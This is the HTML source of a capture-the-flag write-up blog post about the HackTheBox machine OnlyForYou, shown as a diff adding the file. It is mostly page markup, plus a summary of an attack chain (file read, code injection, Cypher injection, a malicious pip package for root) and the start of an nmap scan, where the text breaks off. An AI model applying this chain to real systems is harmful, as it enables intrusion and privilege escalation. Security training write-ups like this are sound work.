@@ -1,0 +1,1828 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='OnlyForYou is a medium difficulty box with a web server containing a main page and a beta/development subdomain. The subdomain source code is provided on its page, and reading through the code reveals an arbitrary file read vulnerability. Leveraging this to read the main page&#39;s source code, we can find another code injection vulnerability. Enumerating the internal ports open on the service shows a self-hosted GOG repository as well as an admin dashboard site, which we can interact using port forwarding techniques such as chisel. The database page within the dashboard is powered by Neo4j, and is vulnerable to Cypher injection. With credentials retrieved from the Neo4j database, we access a user who has sudo privileges to perform pip download as root. By inserting a malicious python package to the GOG repository, we can pip download it as root, resulting in privilege escalation.'><title>HackTheBox - OnlyForYou</title>
+
+<link rel='canonical' href='https://yuwenmichael.netlify.app/post/hackthebox-onlyforyou/'>
+
+<link rel="stylesheet" href="/scss/style.min.59703bed5f69041ffba70837d909b8000139e78c5201b54e051ae44c256c2d69.css"><meta property='og:title' content='HackTheBox - OnlyForYou'>
+<meta property='og:description' content='OnlyForYou is a medium difficulty box with a web server containing a main page and a beta/development subdomain. The subdomain source code is provided on its page, and reading through the code reveals an arbitrary file read vulnerability. Leveraging this to read the main page&#39;s source code, we can find another code injection vulnerability. Enumerating the internal ports open on the service shows a self-hosted GOG repository as well as an admin dashboard site, which we can interact using port forwarding techniques such as chisel. The database page within the dashboard is powered by Neo4j, and is vulnerable to Cypher injection. With credentials retrieved from the Neo4j database, we access a user who has sudo privileges to perform pip download as root. By inserting a malicious python package to the GOG repository, we can pip download it as root, resulting in privilege escalation.'>
+<meta property='og:url' content='https://yuwenmichael.netlify.app/post/hackthebox-onlyforyou/'>
+<meta property='og:site_name' content='Spencer&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='Python' /><meta property='article:tag' content='Arbitrary File Read' /><meta property='article:tag' content='Command Injection' /><meta property='article:tag' content='Chisel' /><meta property='article:tag' content='Port Forwarding' /><meta property='article:tag' content='Neo4j' /><meta property='article:tag' content='Cypher Injection' /><meta property='article:tag' content='pip' /><meta property='article:published_time' content='2023-08-26T12:27:15-05:00'/><meta property='article:modified_time' content='2023-08-26T12:27:15-05:00'/><meta property='og:image' content='https://yuwenmichael.netlify.app/post/hackthebox-onlyforyou/OnlyForYou.png' />
+<meta name="twitter:title" content="HackTheBox - OnlyForYou">
+<meta name="twitter:description" content="OnlyForYou is a medium difficulty box with a web server containing a main page and a beta/development subdomain. The subdomain source code is provided on its page, and reading through the code reveals an arbitrary file read vulnerability. Leveraging this to read the main page&#39;s source code, we can find another code injection vulnerability. Enumerating the internal ports open on the service shows a self-hosted GOG repository as well as an admin dashboard site, which we can interact using port forwarding techniques such as chisel. The database page within the dashboard is powered by Neo4j, and is vulnerable to Cypher injection. With credentials retrieved from the Neo4j database, we access a user who has sudo privileges to perform pip download as root. By inserting a malicious python package to the GOG repository, we can pip download it as root, resulting in privilege escalation."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://yuwenmichael.netlify.app/post/hackthebox-onlyforyou/OnlyForYou.png' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu9f9ff13576eb7121750203f114cffc3e_12283_300x0_resize_q75_box.jpg" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Spencer&#39;s Blog</a></h1>
+            <h2 class="site-description">CTF Adventures</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/spencerja'
+                        target="_blank"
+                        title="Github"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+    stroke-linecap="round" stroke-linejoin="round">
+    <path
+        d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22">
+    </path>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://app.hackthebox.com/profile/1202496'
+                        target="_blank"
+                        title="HackTheBox"
+                    >
+                        
+                        
+                            <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"
+    preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24" fill="currentColor" stroke="none">
+    <g>
+        <path
+            d="M11.9959.0008a1.1187 1.1187 0 00-.057.002.8993.8993 0 00-.2358.0498.9067.9067 0 00-.1652.079L1.9357 5.675a.889.889 0 00-.4444.7699c0 .006.0004.0128.0006.0192-.0002.007 0 .014 0 .0212V17.556a.889.889 0 00.469.7837l9.5983 5.5416c.018.0102.036.0197.054.0287v.002a.8568.8568 0 00.083.0348c0 .001.01.003.012.004.028.01.056.0177.085.0245.01.001.011.003.016.004.028.006.057.0112.086.0146 0 .0005.01.0009.014.001.03.003.061.005.091.005s.061-.002.091-.005c0-.0005.01-.0009.014-.001a.6831.6831 0 00.086-.0146c.01-.001.011-.002.016-.004a.9404.9404 0 00.085-.0245c0-.001.01-.003.012-.004a.8818.8818 0 00.083-.0347v-.002a1.086 1.086 0 00.054-.0287l9.5986-5.5416a.889.889 0 00.4689-.7837V6.4786c0-.009-.0006-.0172-.0008-.0258h.0003v-.008a.8886.8886 0 00-.3117-.6755c-.01-.008-.019-.0162-.029-.0241 0-.002-.01-.005-.01-.007a.8988.8988 0 00-.1074-.0705L12.4533.1267a.8872.8872 0 00-.4646-.1266zm.01 2.2523c.072 0 .1443.0187.209.056l6.5366 3.774c.2789.161.2789.5633 0 .7243l-6.5367 3.774a.4182.4182 0 01-.4182 0L5.26 6.8074c-.2788-.1609-.2789-.5633 0-.7243l6.5368-3.774a.4193.4193 0 01.209-.056zm-8.0801 6.458a.4145.4145 0 01.215.0565l6.524 3.7666a.417.417 0 01.2086.3612v7.5326c0 .3212-.3477.522-.626.3613l-6.5237-3.7666a.4172.4172 0 01-.2086-.3613V9.1288c0-.2408.1955-.414.4107-.4177zm16.1599 0c.215.004.4107.1768.4107.4177v7.5325c0 .149-.08.2868-.2087.3614l-6.5239 3.7666c-.278.1606-.6258-.0401-.6258-.3614v-7.5325c0-.149.08-.2867.2086-.3613l6.5238-3.7666a.415.415 0 01.2152-.0565z">
+        </path>
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://ctftime.org/team/217710'
+                        target="_blank"
+                        title="Team"
+                    >
+                        
+                        
+                            <svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 220.000000 200.000000"
+    preserveAspectRatio="xMidYMid meet">
+    <g transform="translate(0.000000,200.000000) scale(0.100000,-0.100000)" fill="currentColor" stroke="none">
+        <path d="M365 1499 c201 -275 365 -503 365 -507 0 -4 -84 -120 -188 -259 -103
+            -139 -263 -355 -356 -480 -93 -125 -173 -229 -178 -231 -45 -19 101 -22 992
+            -22 l1000 0 0 1000 0 1000 -1000 0 -999 0 364 -501z m1310 -509 l0 -305 -312
+            -3 -313 -2 0 310 0 310 313 -2 312 -3 0 -305z" />
+        <path d="M1150 1194 c0 -2 -1 -95 -1 -206 l0 -203 216 -3 215 -2 0 210 0 210
+            -157 0 -158 0 98 -98 c53 -53 97 -101 97 -106 0 -4 -42 -48 -92 -97 l-93 -88
+            -28 26 -27 27 65 66 65 66 -100 101 c-55 55 -100 99 -100 97z" />
+    </g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://tryhackme.com/p/spencerj'
+                        target="_blank"
+                        title="TryHackMe"
+                    >
+                        
+                        
+                            <svg role="img" viewBox="0 0 24 24" fill="currentColor"  stroke-width="2" xmlns="http://www.w3.org/2000/svg"  stroke-linecap="round" stroke-linejoin="round">
+    <path d="M10.7048 0c-3.164 0-5.8024 2.2853-6.3563 5.2914C2.0493 5.5007.242 7.4381.242 9.7912c0 2.4918 2.0276 4.5191 4.5195 4.5191h6.7616a.625.625 0 000-1.2497H4.7615c-1.8031 0-3.2698-1.467-3.2698-3.2694 0-1.803 1.4667-3.2696 3.2698-3.2696.6552 0 1.287.1925 1.8274.5576a.6252.6252 0 00.8677-.1676.6251.6251 0 00-.168-.8678c-.5105-.345-1.0806-.5756-1.679-.6895.5105-2.3438 2.6006-4.1046 5.0952-4.1046 2.6578 0 4.8555 1.9984 5.1739 4.571a4.489 4.489 0 00-.488.3043.625.625 0 00-.1412.8724.6256.6256 0 00.8729.1408c.5587-.4036 1.2197-.6166 1.9114-.6166 1.547 0 2.894 1.0973 3.203 2.6102a.6254.6254 0 00.7378.4865c.3378-.0689.556-.3992.4871-.7377-.428-2.091-2.2903-3.6087-4.428-3.6087-.3254 0-.6455.037-.9574.1042C16.5567 2.3282 13.8986 0 10.7048 0zm5.1918 10.6402c-.1805 0-.3345.0358-.462.1078a.913.913 0 00-.3124.2909c-.0803.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0363.1639.095.3075.1753.4312a.909.909 0 00.3124.2964c.1275.0732.2815.11.462.11.1806 0 .3343-.0368.4607-.11a.8974.8974 0 00.3086-.2964c.0792-.1237.1372-.2673.1728-.4312a2.3737 2.3737 0 00.0544-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0937-.3046-.173-.4261a.901.901 0 00-.3085-.2909c-.1264-.072-.28-.1078-.4607-.1078zm6.4864 0c-.1806 0-.3347.0358-.4621.1078a.913.913 0 00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/post' >
+                
+                
+                
+                <span>Posts</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/awards' >
+                
+                
+                
+                <span>Trophy Room</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/post/hackthebox-onlyforyou/">
+                <img src="/post/hackthebox-onlyforyou/OnlyForYou_hub67fe2f1a37b4ddd8d67f8b532b1624d_359490_800x0_resize_box_3.png"
+                        srcset="/post/hackthebox-onlyforyou/OnlyForYou_hub67fe2f1a37b4ddd8d67f8b532b1624d_359490_800x0_resize_box_3.png 800w, /post/hackthebox-onlyforyou/OnlyForYou_hub67fe2f1a37b4ddd8d67f8b532b1624d_359490_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="606" 
+                        loading="lazy"
+                        alt="Featured image of post HackTheBox - OnlyForYou" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hack-the-box/" >
+                Hack The Box
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/hackthebox-onlyforyou/">HackTheBox - OnlyForYou</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            OnlyForYou is a medium difficulty box with a web server containing a main page and a beta/development subdomain. The subdomain source code is provided on its page, and reading through the code reveals an arbitrary file read vulnerability. Leveraging this to read the main page&#39;s source code, we can find another code injection vulnerability. Enumerating the internal ports open on the service shows a self-hosted GOG repository as well as an admin dashboard site, which we can interact using port forwarding techniques such as chisel. The database page within the dashboard is powered by Neo4j, and is vulnerable to Cypher injection. With credentials retrieved from the Neo4j database, we access a user who has sudo privileges to perform pip download as root. By inserting a malicious python package to the GOG repository, we can pip download it as root, resulting in privilege escalation.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Aug 26, 2023</time>
+            </div>
+        
+
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="enumeration">Enumeration</h2>
+<p>Initial nmap:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Starting Nmap 7.94 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2023-04-22 16:11 EDT
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.210
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.038s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 <span class="o">(</span>ECDSA<span class="o">)</span>
